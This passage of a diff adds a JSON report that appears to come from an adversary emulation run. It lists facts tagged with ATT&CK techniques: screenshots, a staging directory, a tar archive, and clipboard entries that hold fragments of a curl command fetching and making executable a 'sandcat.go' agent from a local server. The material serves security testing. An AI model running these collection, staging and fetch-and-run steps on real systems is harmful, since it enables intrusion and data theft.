+          "variations": []
+        }
+      ]
+    }
+  },
+  "jitter": "4/8",
+  "facts": [
+    {
+      "unique": "host.dir.staged/Users/TestAcctLocal3/staged",
+      "trait": "host.dir.staged",
+      "value": "/Users/TestAcctLocal3/staged",
+      "score": 2,
+      "tactic": "T1074"
+    },
+    {
+      "unique": "host.file.path/Users/TestAcctLocal3/screen-1.png",
+      "trait": "host.file.path",
+      "value": "/Users/TestAcctLocal3/screen-1.png",
+      "score": 6,
+      "tactic": "T1113"
+    },
+    {
+      "unique": "host.file.path/Users/TestAcctLocal3/screen-2.png",
+      "trait": "host.file.path",
+      "value": "/Users/TestAcctLocal3/screen-2.png",
+      "score": 6,
+      "tactic": "T1113"
+    },
+    {
+      "unique": "host.file.path/Users/TestAcctLocal3/screen-3.png",
+      "trait": "host.file.path",
+      "value": "/Users/TestAcctLocal3/screen-3.png",
+      "score": 6,
+      "tactic": "T1113"
+    },
+    {
+      "unique": "host.file.path/Users/TestAcctLocal3/screen-4.png",
+      "trait": "host.file.path",
+      "value": "/Users/TestAcctLocal3/screen-4.png",
+      "score": 6,
+      "tactic": "T1113"
+    },
+    {
+      "unique": "host.file.path/Users/TestAcctLocal3/screen-5.png",
+      "trait": "host.file.path",
+      "value": "/Users/TestAcctLocal3/screen-5.png",
+      "score": 6,
+      "tactic": "T1113"
+    },
+    {
+      "unique": "host.file.path//127.0.0.1:8888\";curl",
+      "trait": "host.file.path",
+      "value": "//127.0.0.1:8888\";curl",
+      "score": 4,
+      "tactic": "T1115"
+    },
+    {
+      "unique": "host.file.path/file/download > sandcat.go;chmod",
+      "trait": "host.file.path",
+      "value": "/file/download > sandcat.go;chmod",
+      "score": 4,
+      "tactic": "T1115"
+    },
+    {
+      "unique": "host.file.path/sandcat.go",
+      "trait": "host.file.path",
+      "value": "/sandcat.go",
+      "score": 4,
+      "tactic": "T1115"
+    },
+    {
+      "unique": "host.dir.compress/Users/TestAcctLocal3/staged.tar.gz",
+      "trait": "host.dir.compress",
+      "value": "/Users/TestAcctLocal3/staged.tar.gz",
+      "score": 1,
+      "tactic": "T1002"
+    }
+  ],
+  "skipped_abilities": [
+    {
+      "itmitq": [
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
+          "ability_name": "Find files"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "4e97e699-93d7-4040-b5a3-2e906a58199e",
+          "ability_name": "Stage sensitive files"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "de52784d-4de6-4d4e-b79e-e7b68fe037fb",
+          "ability_name": "Add bookmark"
+        }
+      ]
+    }
+  ]
+}
